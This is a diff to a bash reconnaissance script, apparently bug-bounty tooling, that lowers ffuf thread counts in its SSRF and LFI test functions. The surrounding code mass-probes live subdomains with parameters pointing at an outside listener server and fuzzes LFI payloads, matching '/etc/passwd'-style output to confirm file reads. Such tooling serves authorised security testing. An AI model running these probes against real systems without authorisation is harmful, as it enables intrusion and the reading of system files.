@@ -560,7 +560,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
-    xargs -P 2 -I {} ffuf -s -timeout 1 -ignore-body -t 500 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -P 2 -I {} ffuf -s -timeout 1 -ignore-body -t 100 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -571,7 +571,7 @@ ssrftest(){
       echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $customSsrfQueryList wc -l)
       echo "requests count = $ENDPOINTCOUNT"
-          ffuf -s -timeout 1 -ignore-body -t 500 -u HOST${LISTENSERVER} -w $customSsrfQueryList:HOST > /dev/null
+          ffuf -s -timeout 1 -ignore-body -t 100 -u HOST${LISTENSERVER} -w $customSsrfQueryList:HOST > /dev/null
       echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
       echo
     fi
@@ -591,7 +591,7 @@ ssrftest(){
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -s -timeout 1 -ignore-body -t 500 -u HOSTPATH \
+          ffuf -s -timeout 1 -ignore-body -t 100 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
 
@@ -611,7 +611,7 @@ lfitest(){
       ENDPOINTCOUNT=$(< $LFIPAYLOAD wc -l)
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
-        ffuf -s -timeout 5 -t 500 -u HOSTPATH \
+        ffuf -s -timeout 5 -t 100 -u HOSTPATH \
              -w $customLfiQueryList:HOST \
              -w $LFIPAYLOAD:PATH \
              -mr "root:[x*]:0:0:" \
